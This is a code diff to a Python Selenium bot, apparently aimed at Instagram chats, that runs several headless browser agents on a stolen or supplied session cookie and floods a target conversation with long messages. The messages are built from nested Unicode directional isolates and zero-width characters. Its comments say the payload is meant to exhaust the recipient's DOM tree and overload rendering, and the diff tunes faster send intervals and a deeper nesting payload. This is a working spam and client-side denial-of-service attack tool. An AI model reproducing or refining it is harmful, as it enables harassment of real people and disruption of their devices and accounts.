@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER.OWNS (ATOMIC-DISPATCH V53)
-# 📅 STATUS: ZERO-TYPING-LAG | 4-AGENT TOTAL | AWS-CPU-TARGET
+# 🚀 PROJECT: PRAVEER.OWNS (TREE-EXHAUSTION V54)
+# 📅 STATUS: DOM-TREE-LOCK | 4-AGENT TOTAL | AWS-CPU-TARGET
 
 import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
 from concurrent.futures import ThreadPoolExecutor
@@ -12,27 +12,31 @@ from selenium.webdriver.chrome.options import Options
 # --- 4 AGENTS TOTAL CONFIG ---
 AGENTS_PER_MACHINE = 2             
 TOTAL_DURATION = 25000 
-BURST_SPEED = (0.5, 1.2)    # 🛡️ Optimized for delivery success
-REST_AFTER_STRIKES = 80    
-REST_DURATION = 5          
+BURST_SPEED = (0.3, 0.7)    # 🛡️ Tuned for visibility and delivery
+REST_AFTER_STRIKES = 100   
+REST_DURATION = 4          
 
 GLOBAL_SENT = 0
 COUNTER_LOCK = threading.Lock()
 BROWSER_LAUNCH_LOCK = threading.Lock()
 
-def get_atomic_payload():
-    """Generates a visible, high-impact block that forces CPU recalculation."""
+def get_tree_lock_payload():
+    """Generates a nested directional staircase to exhaust the DOM tree."""
     u_id = random.randint(100, 999)
-    # \u2060 = Word Joiner | \u2068 = Isolate | \u200D = ZWJ
-    glue, iso, zwj, pop = "\u2060", "\u2068", "\u200D", "\u2069"
+    # \u2066 = LTR Isolate | \u2067 = RTL Isolate | \u2069 = Pop
+    # \u200D = ZWJ | \u2060 = Word Joiner
+    lri, rli, pop, zwj, glue = "\u2066", "\u2067", "\u2069", "\u200D", "\u2060"
     
-    header = f"👑 PRAVEER PAPA ON TOP 🌙 [STRIKE_NODE:{u_id}]"
+    header = f"👑 PRAVEER PAPA ON TOP 🌙 [NODE_CRUSH:{u_id}]"
     
     body = []
-    # 380 lines of recursive complexity to overwhelm the 32GB AWS CPU
-    for i in range(380):
-        # Nested isolates combined with ZWJ bonding
-        line = f"{iso}PRAVEER{zwj}PAPA{zwj}ON{zwj}TOP{zwj}🌙{i}{pop}{glue*12}"
+    # 400 lines of recursive staircase math
+    for i in range(400):
+        # We nest isolates inside each other. 
+        # This forces the browser to build a 'Deep Tree' instead of a 'Long Line'.
+        # Every word is a new branch in the C++ rendering engine.
+        nest = f"{lri}PR{zwj}AV{zwj}EE{zwj}R{pop}{rli}PA{zwj}PA{pop}{lri}TO{zwj}P{pop}"
+        line = f"{nest} 🌙 {i}{glue*10}"
         body.append(line)
         
     return f"{header}\n{glue.join(body)}".strip()[:9995]
@@ -43,9 +47,7 @@ def get_driver(agent_id):
         chrome_options.add_argument("--headless=new") 
         chrome_options.add_argument("--no-sandbox") 
         chrome_options.add_argument("--disable-dev-shm-usage")
-        # 🛡️ Keep YOUR bot's CPU light by disabling rendering
         chrome_options.add_argument("--disable-gpu")
-        chrome_options.add_argument("--blink-settings=imagesEnabled=false")
         
         ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
         chrome_options.add_argument(f"user-agent={ua}")
@@ -55,21 +57,20 @@ def get_driver(agent_id):
         return driver
 
 def atomic_dispatch_send(driver, text):
-    """Force-triggers the send event by bypassing the UI thread entirely."""
+    """Fires a high-priority JS event to bypass the UI thread queue."""
     try:
         driver.execute_script("""
             var box = document.querySelector('div[role="textbox"], textarea');
             if (box) {
                 box.focus();
-                // 1. Force a clean state to prevent 'Typing' hang
                 document.execCommand('selectAll', false, null);
                 document.execCommand('delete', false, null);
-                // 2. Direct string injection
                 document.execCommand('insertText', false, arguments[0]);
-                // 3. Trigger React/internal input sync
+                
+                // Trigger Framework Sync
                 box.dispatchEvent(new Event('input', { bubbles: true }));
                 
-                // 4. Fire high-priority keyboard event
+                // Dispatch Trusted Keyboard Event
                 var e = new KeyboardEvent('keydown', {
                     key: 'Enter', code: 'Enter', keyCode: 13, which: 13, 
                     bubbles: true, cancelable: true
@@ -91,23 +92,23 @@ def run_life_cycle(agent_id, cookie, target):
             
             strike_count = 0
             while True:
-                payload = get_atomic_payload()
+                payload = get_tree_lock_payload()
                 if atomic_dispatch_send(driver, payload):
                     strike_count += 1
                     with COUNTER_LOCK:
                         global GLOBAL_SENT
                         GLOBAL_SENT += 1
-                    print(f"Agent {agent_id}: Atomic-Strike ({GLOBAL_SENT})")
+                    print(f"Agent {agent_id}: Node-Strike ({GLOBAL_SENT})")
                     
-                    if strike_count % 50 == 0:
+                    if strike_count % 60 == 0:
                         driver.refresh()
-                        time.sleep(10)
+                        time.sleep(8)
                 
                 time.sleep(random.uniform(*BURST_SPEED))
         except: pass
         finally:
             if driver: driver.quit()
-            time.sleep(5)
+            time.sleep(3)
 
 def main():
     cookie = os.environ.get("INSTA_COOKIE", "").strip()
